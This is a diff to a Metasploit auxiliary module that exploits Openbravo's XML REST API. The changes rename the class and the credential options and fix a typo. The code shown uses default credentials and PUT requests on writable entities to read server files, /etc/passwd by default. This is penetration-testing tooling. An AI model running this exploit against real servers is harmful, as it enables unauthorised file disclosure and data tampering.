@@ -8,7 +8,7 @@ require 'rex'
 require 'net/dns'
 require 'rexml/document'
 
-class Metasploit4 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
@@ -41,8 +41,8 @@ class Metasploit4 < Msf::Auxiliary
     register_options(
       [
         OptString.new('TARGETURI', [ true, "Base Openbravo directory path", '/openbravo/']),
-        OptString.new('USERNAME', [true, "The Openbravo user", "Openbravo"]),
-        OptString.new('PASSWORD', [true, "The Openbravo password", "openbravo"]),
+        OptString.new('HttpUsername', [true, "The Openbravo user", "Openbravo"]),
+        OptString.new('HttpPassword', [true, "The Openbravo password", "openbravo"]),
         OptString.new('FILEPATH', [true, "The filepath to read on the server", "/etc/passwd"]),
         OptString.new('ENDPOINT', [true, "The XML API REST endpoint to use", "ADUser"])
       ], self.class)
@@ -53,7 +53,7 @@ class Metasploit4 < Msf::Auxiliary
     users = send_request_raw({
       'method' => 'GET',
       'uri' => normalize_uri(datastore['TARGETURI'], "/ws/dal/#{datastore["ENDPOINT"]}"),
-      'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD'])
+      'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword'])
     }, 60)
 
     if !users or users.code != 200
@@ -86,7 +86,7 @@ class Metasploit4 < Msf::Auxiliary
         'method' => 'PUT',
         'uri' => normalize_uri(target_uri.path, "/ws/dal/#{datastore["ENDPOINT"]}/#{id}"),
         'data' => xml,
-        'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD'])
+        'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword'])
       })
 
       if !resp or resp.code != 200 or resp.body =~ /Not updating entity/
@@ -94,12 +94,12 @@ class Metasploit4 < Msf::Auxiliary
         next
       end
 
-      print_status("Found writeable #{datastore["ENDPOINT"]}: #{other_id}")
+      print_status("Found writable #{datastore["ENDPOINT"]}: #{other_id}")
 
       u = send_request_raw({
         'method' => 'GET',
         'uri' => normalize_uri(datastore['TARGETURI'], "/ws/dal/#{datastore["ENDPOINT"]}/#{id}"),
-        'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD'])
+        'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword'])
       })
 
       u = REXML::Document.new u.body
@@ -116,7 +116,7 @@ class Metasploit4 < Msf::Auxiliary
         'method' => 'PUT',
         'uri' => normalize_uri(target_uri.path, "/ws/dal/#{datastore["ENDPOINT"]}/#{id}"),
       'data' => xml,
-      'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD'])
+      'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword'])
       })
 
       print_good("File saved to: #{path}")
